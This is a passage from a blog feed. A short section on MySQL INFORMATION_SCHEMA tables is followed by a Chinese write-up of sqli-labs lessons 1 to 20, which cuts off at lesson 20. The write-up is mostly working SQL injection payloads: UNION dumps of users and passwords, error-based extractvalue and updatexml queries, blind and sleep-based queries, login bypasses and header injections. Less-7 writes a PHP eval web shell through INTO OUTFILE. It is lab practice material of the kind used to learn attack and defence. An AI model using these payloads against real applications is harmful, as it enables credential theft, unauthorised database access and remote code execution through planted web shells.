:这个表记录的就是触发器的信息，包括所有的相关的信息。系统的和自己用户创建的触发器。</p><p>VIEWS :视图的信息，也是系统的和用户的基本视图信息。</p><p>这些表存储的都是一些数据库的实体对象，方便我们进行查询和管理，对于一个DBA来说，这些表能够大大方便我们的工作，更快更方便的了结和查询数据库的相关信息。</p><h1 id="4：约束外键等相关的一些表"><a href="#4：约束外键等相关的一些表" class="headerlink" title="4：约束外键等相关的一些表"></a>4：约束外键等相关的一些表</h1><p>REFERENTIAL_CONSTRAINTS：这个表提供的外键相关的信息，而且只提供外键相关信息</p><p>TABLE_CONSTRAINTS ：这个表提供的是 相关的约束信息</p><p>INNODB_SYS_FOREIGN_COLS ：这个表也是存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的</p><p>INNODB_SYS_FOREIGN ：存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的，只不过是单独对于INNODB来说的</p><p>KEY_COLUMN_USAGE：数据库中所有有约束的列都会存下下来，也会记录下约束的名字和类别</p><p>为什么要把外键和约束单列出来呢，因为感觉这是一块独立的东西，虽然我们的生产环境大部分都不会使用外键，因为这会降低性能，但是合理的利用约束还是一个不错的选择，比如唯一约束。</p><h1 id="5：关于管理的一些的一些表"><a href="#5：关于管理的一些的一些表" class="headerlink" title="5：关于管理的一些的一些表"></a>5：关于管理的一些的一些表</h1><p>GLOBAL_STATUS ，GLOBAL_VARIABLES，SESSION_STATUS，SESSION_VARIABLES：这四张表分别记录了系统的变量，状态（全局和会话的信息），作为DBA相信大家也都比较熟悉了，而且这几张表也是在系统重启的时候回重新加载的。也就是内存表。</p><p>PARTITIONS ：MySQL分区表相关的信息，通过这张表我们可以查询到分区的相关信息（数据库中已分区的表，以及分区表的分区和每个分区的数据信息）</p><p>PROCESSLIST：show processlist其实就是从这个表拉取数据，PROCESSLIST的数据是他的基础。由于是一个内存表，所以我们相当于在内存中查询一样，这些操作都是很快的。</p><p>INNODB_CMP_PER_INDEX，INNODB_CMP_PER_INDEX_RESET：这两个表存储的是关于压缩INNODB信息表的时候的相关信息,有关整个表和索引信息都有.我们知道对于一个INNODB压缩表来说,不管是数据还是二级索引都是会被压缩的,因为数据本身也可以看作是一个聚集索引。</p><p>INNODB_CMPMEM ，INNODB_CMPMEM_RESET：这两个表是存放关于MySQL INNODB的压缩页的buffer pool信息，但是要注意一点的就是,用这两个表来收集所有信息的表的时候,是会对性能造成严重的影响的,所以说默认是关闭状态的。如果要打开这个功能的话我们要设置innodb_cmp_per_index_enabled参数为ON状态。</p><p>INNODB_BUFFER_POOL_STATS ：表提供有关INNODB 的buffer pool相关信息，和show engine innodb status提供的信息是相同的。也是show engine innodb status的信息来源。</p><p>INNODB_BUFFER_PAGE_LRU，INNODB_BUFFER_PAGE :维护了INNODB LRU LIST的相关信息</p><p>INNODB_BUFFER_PAGE ：这个表就比较屌了，存的是buffer里面缓冲的页数据。查询这个表会对性能产生很严重的影响，千万不要再我们自己的生产库上面执行这个语句，除非你能接受服务短暂的停顿</p><p>INNODB_SYS_DATAFILES ：这张表就是记录的表的文件存储的位置和表空间的一个对应关系(INNODB)</p><p>INNODB_TEMP_TABLE_INFO ：这个表惠记录所有的INNODB的所有用户使用到的信息，但是只能记录在内存中和没有持久化的信息。</p><p>INNODB_METRICS ：提供INNODB的各种的性能指数，是对INFORMATION_SCHEMA的补充，收集的是MySQL的系统统计信息。这些统计信息都是可以手动配置打开还是关闭的。有以下参数都是可以控制的：innodb_monitor_enable, innodb_monitor_disable, innodb_monitor_reset, innodb_monitor_reset_all。</p><p>INNODB_SYS_VIRTUAL :表存储的是INNODB表的虚拟列的信息，当然这个还是比较简单的，在MySQL 5.7中，支持两种Generated Column，即Virtual Generated Column和Stored Generated Column，前者只将Generated Column保存在数据字典中（表的元数据），并不会将这一列数据持久化到磁盘上；后者会将Generated Column持久化到磁盘上，而不是每次读取的时候计算所得。很明显，后者存放了可以通过已有数据计算而得的数据，需要更多的磁盘空间，与实际存储一列数据相比并没有优势，因此，MySQL 5.7中，不指定Generated Column的类型，默认是Virtual Column。</p><p>INNODB_CMP，INNODB_CMP_RESET：存储的是关于压缩INNODB信息表的时候的相关信息，详细请见推荐笔记。</p><p>为什么把这些表列为管理相关的表呢，因为我感觉像连接，分区，压缩表，innodb buffer pool等表，我们通过这些表都能很清晰的看到自己数据库的相关功能的状态，特别是我们通过一些变量更容易窥透MySQL的运行状态，方便我们进行管理。</p><h1 id="6：关于表信息和索引信息的一些表"><a href="#6：关于表信息和索引信息的一些表" class="headerlink" title="6：关于表信息和索引信息的一些表"></a>6：关于表信息和索引信息的一些表</h1><p>TABLES，TABLESPACES，INNODB_SYS_TABLES ，INNODB_SYS_TABLESPACES ：</p><p>TABLES这张表毫无疑问了，就是记录的数据库中表的信息，其中包括系统数据库和用户创建的数据库。show table status like ‘test1’\G的来源就是这个表；</p><p>TABLESPACES 却是标注的活跃表空间。 这个表是不提供关于innodb的表空间信息的，对于我们来说并没有太大作用，因为我们生产库是强制INNODB的；</p><p>INNODB_SYS_TABLES 这张表依赖的是SYS_TABLES数据字典中拉取出来的。此表提供了有关表格的格式和存储特性，包括行格式，压缩页面大小位级别的信息（如适用）</p><p>提供的是关于INNODB的表空间信息，其实和SYS_TABLESPACES 中的INNODB信息是一致的。</p><p>STATISTICS：这个表提供的是关于表的索引信息，所有索引的相关信息。</p><p>INNODB_SYS_INDEXES：提供相关INNODB表的索引的相关信息，和SYS_INDEXES 这个表存储的信息基本是一样的，只不过后者提供的是所有存储引擎的索引信息，后者只提供INNODB表的索引信息。</p><p>INNODB_SYS_TABLESTATS：</p><p>这个表就比较重要了，记录的是MySQL的INNODB表信息以及MySQL优化器会预估SQL选择合适的索引信息，其实就是MySQL数据库的统计信息</p><p>这个表的记录是记录在内存当中的，是一个内存表，每次重启后就会重新记录，所以只能记录从上次重启后的数据库统计信息。有了这个表，我们对于索引的维护就更加方便了，我们可以查询索引的使用次数，方便清理删除不常用的索引，提高表的更新插入等效率，节省磁盘空间。</p><p>INNODB_SYS_FIELDS ：这个表记录的是INNODB的表索引字段信息，以及字段的排名</p><p>INNODB_FT_CONFIG :这张表存的是全文索引的信息</p><p>INNODB_FT_DEFAULT_STOPWORD：这个表存放的是stopword 的信息,是和全文索引匹配起来使用的，和innodb的 INFORMATION_SCHEMA.INNODB_FT_DEFAULT_STOPWORD 是相同的，这个STOPWORD必须是在创建索引之前创建，而且必须指定字段为varchar。stopword 也就是我们所说的停止词，全文检索时，停止词列表将会被读取和检索，在不同的字符集和排序方式下，会造成命中失败或者找不到此数据，这取决于停止词的不同的排序方式。我们可以使用这个功能筛选不必要字段。</p><p>INNODB_FT_INDEX_TABLE：这个表存储的是关于INNODB表有全文索引的索引使用信息的，同样这个表也是要设置innodb_ft_aux_table以后才能够使用的，一般情况下是空的</p><p>INNODB_FT_INDEX_CACHE ：这张表存放的是插入前的记录信息，也是为了避免DML时候昂贵的索引重组</p><h1 id="7：关于MySQL优化相关的一些表"><a href="#7：关于MySQL优化相关的一些表" class="headerlink" title="7：关于MySQL优化相关的一些表"></a>7：关于MySQL优化相关的一些表</h1><p>OPTIMIZER_TRACE ：提供的是优化跟踪功能产生的信息.</p><p>PROFILING：SHOW PROFILE可以深入的查看服务器执行语句的工作情况。以及也能帮助你理解执行语句消耗时间的情况。一些限制是它没有实现的功能，不能查看和剖析其他连接的语句，以及剖析时所引起的消耗。</p><p>SHOW PROFILES显示最近发给服务器的多条语句，条数根据会话变量profiling_history_size定义，默认是15，最大值为100。设为0等价于关闭分析功能。详细信息请见MySQL profile</p><p>INNODB_FT_BEING_DELETED,INNODB_FT_DELETED: INNODB_FT_BEING_DELETED 这张表是INNODB_FT_DELETED的一个快照,只在OPTIMIZE TABLE 的时候才会使用。</p><h1 id="8：关于MySQL事物和锁的相关的一些表"><a href="#8：关于MySQL事物和锁的相关的一些表" class="headerlink" title="8：关于MySQL事物和锁的相关的一些表"></a>8：关于MySQL事物和锁的相关的一些表</h1><p>INNODB_LOCKS:现在获取的锁，但是不含没有获取的锁，而且只是针对INNODB的。</p><p>INNODB_LOCK_WAITS：系统锁等待相关信息，包含了阻塞的一行或者多行的记录，而且还有锁请求和被阻塞改请求的锁信息等。</p><p>INNODB_TRX：包含了所有正在执行的的事物相关信息（INNODB），而且包含了事物是否被阻塞或者请求锁。</p><p>我们通过这些表就能够很方便的查询出来未结束的事物和被阻塞的进程</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql Lab(1-20)</title>
      <link href="/2019/01/20/sql-lab(1-20)/"/>
      <url>/2019/01/20/sql-lab(1-20)/</url>
      
        <content type="html"><![CDATA[<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>输入单引号后报错，根据报错信息，可以确定输入参数的内容被存放到一对单引号中间<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8ed303d5a01b939f.png" alt="图片.png"></p><p><strong>爆表：</strong><br>用到语句：<code>id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a99474d1e6d9f9be.png" alt="图片.png"></p><p><strong>爆列：</strong><br>用到语句：<code>id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-54ba0a1a12292d3c.png" alt="图片.png"></p><p><strong>爆值：</strong><br>用到语句：<code>id=0&#39; union select 1,group_concat(username,password),3 from users--+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-00b38aefa57a6f8e.png" alt="图片.png"><br><strong>注意：</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-9cf6bb03b0477ac3.png" alt="图片.png"><br>图中的3换成几都可以但不能为空，且前后这个地方出现的数应该一致</p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>输入单引号后报错，根据报错信息确定输入的内容被带入到数据库中，也可叫做数字型注入<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-7e7a4c12c424b668.png" alt="图片.png"><br><strong>爆表：</strong><br>用到语句：<code>id=0 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database() --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-3cab721b2e202e91.png" alt="图片.png"></p><p><strong>爆列：</strong><br>用到语句：<code>id=0 union select 1,group_concat(column_name),2 from information_schema.columns where table_name=&#39;users&#39; --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-7f83edde0c4b3016.png" alt="图片.png"></p><p><strong>爆值：</strong><br>用到语句：<code>id=0 union select 1,group_concat(username,password),2 from users--+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-612b750803ecf8a9.png" alt="图片.png"></p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>输入单引号，根据报错信息确定输入的内容存放到一对单引号加圆括号中了<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-83785d69e3de34e7.png" alt="图片.png"><br><strong>爆表：</strong><br>用到语句：<code>id=0&#39;) union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database() --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5fa39b2e6119da6c.png" alt="图片.png"></p><p><strong>爆列：</strong><br>用到语句：<code>id=0&#39;) union select 1,group_concat(column_name),1 from information_schema.columns where table_name=&#39;users&#39; --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-90097210a097385c.png" alt="图片.png"></p><p><strong>爆值：</strong><br>用到语句：<code>id=0&#39;) union select 1,group_concat(username,password),1 from users--+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-45a4648948d55d22.png" alt="图片.png"></p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>输入单引号没有报错，尝试输入双引号，页面报错，根据报错信息判断出输入的内容被放到一对双引号和圆括号中<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d06e9d9a3e47c19a.png" alt="图片.png"><br><strong>爆表：</strong><br>用到语句：<code>id=0&quot;) union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database() --+</code></p><p><strong>爆列：</strong><br>用到语句：<code>id=0&quot;) union select 1,group_concat(column_name),1 from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p><strong>爆值：</strong><br>用到语句：<code>id=0&quot;) union select 1,group_concat(username,password),1 from users--+</code></p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>输入单引号报错，根据报错信息，可以确定输入参数的内容被存放到一对单引号中间<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-9de396b32526c0de.png" alt="图片.png"><br><strong>爆表：</strong><br>用到语句：<code>id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-43611833bd97c62e.png" alt="图片.png"><br>等等，好像不管用啊，是哪里出问题了吗？？UNION联合查询型注入不能用了…那试试布尔盲注，时间延迟型注入或者报错型注入,听说布尔和时间需要用sqlmap跑，那就试试报错注入吧</p><blockquote><p>爆表<br>用到语句：<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p></blockquote><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-fd599c9ef18d8355.png" alt="tables.png"></p><blockquote><p>爆列<br>1<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+</code><br>2<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;us&#39;,&#39;user&#39;,&#39;password&#39;,&#39;avatar&#39;,&#39;last_login&#39;)))) --+</code></p></blockquote><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-50753c0d2d4eabe8.png" alt="columns.png"><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-6ab70291c93b4346.png" alt="keepon.png"></p><blockquote><p>爆值<br>1<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+</code><br>2<code>?id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;I-kill-you&#39;))))--+</code></p></blockquote><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e59c6f140b120cad.png" alt="username.png"><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-91d3f63515795d7c.png" alt="keepon.png"></p><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>用双引号试完，发现<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-bec9171c36665288.png" alt="图片.png"><br>根据报错信息判断出输入的内容被放到一对双引号中<br>用报错注入，与less-5类似只是把id改成id&#x3D;1”即可</p><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>可能由于权限问题，一直写不进文件，在这里我简述一下方法，后续我会研究研究如何获取文件权限。<br>这道题是转储文件get字符型注入<br>通过payload 导入到指定的路径<br>导入：<br><code>Payload:?id=1&#39;)) union select 1,&#39;2&#39;,&#39;&lt;?php @eval($_POST[&quot;xx&quot;]);?&gt;&#39; into outfile &#39;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\1.txt&#39; %23</code><br>导出：<br><code>Payload:id=((&#39;1&#39;)) union select 1,load_file (&#39;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\1.txt&#39;),&#39;3&#39; #&#39;))</code></p><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>这一个和第七个其实差不多，主要就是把报错全部过滤了，如果错误就没有返回，正确就返回you are in……但是其实都一样，两个不同的返回可以利用基于布尔的盲注进行测试：</p><blockquote><p>盲注需要掌握一些MySQL的相关函数：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。*注意:这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">mid(str,pos,len):跟上面的一样，截取字符串</span><br><span class="line"> ascii(str)：返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">ord(str):同上，返回ascii码</span><br><span class="line">if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</span><br></pre></td></tr></table></figure><blockquote><p>常见的ASCII，A:65,Z:90 a:97,z:122,  0:48, 9:57</p></blockquote><p>首先select database()查询数据库</p><p>ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码</p><p>ascii(substr((select database()),1,1))&gt;64：ascii大于64就返回true，if就返回1，否则返回0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select database()),1,1))&gt;64, 1, 0) %23</span><br></pre></td></tr></table></figure><p>或者这样就简单一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;64 %23</span><br></pre></td></tr></table></figure><p>猜数据库名：<br>由于脚本语言还没学习到，也不会使用工具，只好使用二分法。。一个漫长的过程。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;96 %23 返回正确，大于96</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&lt;123 %23 返回正确，小于123 ，区间在97-122 </span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;109 %23 返回正确，大于109，区间在110-122</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;116 %23 返回错误，所以在110-116之间</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;112 %23 返回正确，大于112，区间在113-116之间</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;114 %23 返回正确，大于114，间在115-116之间</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;115 %23 返回错误，不大于115，即第一个字母的ascii为115，即字母s</span><br></pre></td></tr></table></figure><p>剩下的方式同前面，这里就不叙述了</p><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>由于不管怎么输入都会被过滤，返回同一个结果，所以只能用时间延迟注入<br><code>payload:?id=1’ and sleep(5) %23</code><br><code>payload:?id=1’ and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23</code></p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>同上，只是由单引号变为双引号<br><code>payload:?id=1” and sleep(5) %23</code><br><code>payload:?id=1” and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23</code></p><blockquote><p>11-20全都是POST型，可以使用抓包工具。</p></blockquote><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>错误的post单引号注入 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;a&#x27;&#x27; and password=&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p><code>payload-post:username=a ’ or 1=1 # &amp;password=xxxxx</code></p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>错误的post双引号注入:<br>尝试输入a”<br>返回错误信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;a&quot;&quot;) and password=(&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p><code>payload-post:username=test “) or 1=1 # &amp;password=xxxxx</code></p><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>尝试输入a ’<br>返回错误信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;a&#x27;&#x27;) and password=(&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p><code>payload-post:username=test ‘) or 1=1 # &amp;password=xxxxx</code></p><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>尝试输入a”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;a&quot;&quot; and password=&quot;&quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p><code>payload-post:username=a&amp;password=a” or “1”=”1</code></p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>bool型&#x2F;时间延迟单引号POST型盲注<br>这次输入’ “都没有错误<br>看了一下源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; </span><br><span class="line">$result=mysql_query($sql); </span><br><span class="line">$row = mysql_fetch_array($result); </span><br><span class="line">if($row)</span><br><span class="line">&#123; </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这是一个盲注，通过返回正确信息判断是否注入成功</p><blockquote><p>payload-post:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or &#x27;1&#x27;=&#x27;1 &amp;password=xxx</span><br><span class="line">username=&#x27; or 1=1 # &amp;password=xxx</span><br><span class="line">username=&#x27; or (length(database())) = 8 #&amp;password=xxx</span><br><span class="line">username=&#x27; or (ascii(substr((select database()) ,1,1))) = 115 #&amp;password=xxx</span><br></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>bool型&#x2F;时间延迟的双引号POST型盲注<br>尝试输入 a”) or 1&#x3D;1 #<br>然后构造带有括号的注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=&quot;) or (&quot;1&quot;)=(&quot;1   &amp;passwd=xxx</span><br><span class="line">username=&quot;) or 1=1 or if(1=1, sleep(1), null)  # &amp;passwd=xxx</span><br><span class="line">username=&quot;) or (length(database())) = 8 # &amp;passwd=xxx</span><br><span class="line">username=&quot;) or (ascii(substr((select database()) ,1,1))) = 115  or if(1=1, sleep(1), null)  # &amp;passwd=xxx</span><br></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>密码重置，源码见下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&#x27;uname&#x27;]); </span><br><span class="line">$passwd = check_input($_POST[&#x27;passwd&#x27;]);</span><br><span class="line"> @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; </span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"> $row = mysql_fetch_array($result); </span><br><span class="line">if($row)</span><br><span class="line">&#123; </span><br><span class="line">$row1 = $row[&#x27;username&#x27;]; </span><br><span class="line">$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; mysql_query($update);</span><br><span class="line"> if (mysql_error())</span><br><span class="line">&#123; </span><br><span class="line">print_r(mysql_error());</span><br><span class="line"> &#125;else</span><br><span class="line">&#123;  </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;; </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看数据库，只需输入正确的用户名即可<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d557b1a6d12a1ad9.png" alt="图片.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload-post:</span><br><span class="line">username:admin &amp;passwd=xxx</span><br></pre></td></tr></table></figure><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&#x27;uname&#x27;]);</span><br><span class="line"> $passwd = check_input($_POST[&#x27;passwd&#x27;]);</span><br><span class="line"> $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line"> $result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1); </span><br><span class="line">if($row1)</span><br><span class="line">&#123; </span><br><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; </span><br><span class="line">mysql_query($insert); </span><br><span class="line">echo &#x27;Your User Agent is: &#x27; .$uagent; </span><br><span class="line">print_r(mysql_error()); </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;;</span><br><span class="line"> &#125;else</span><br><span class="line">&#123; </span><br><span class="line">print_r(mysql_error()); </span><br><span class="line">echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过查看源码看到，是一个insert的语句，通过构造updatexml xpath错误信息来返回数据<br>通过构造User-Agent<br><code>payload-header:User-Agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0&#39; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code></p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>头部的Referer POST报错注入<br>同上只是构造的请求头不一样<br>通过构造Referer<br><code>Referer: http://localhost/sqli-labs/Less-19/ ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code></p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 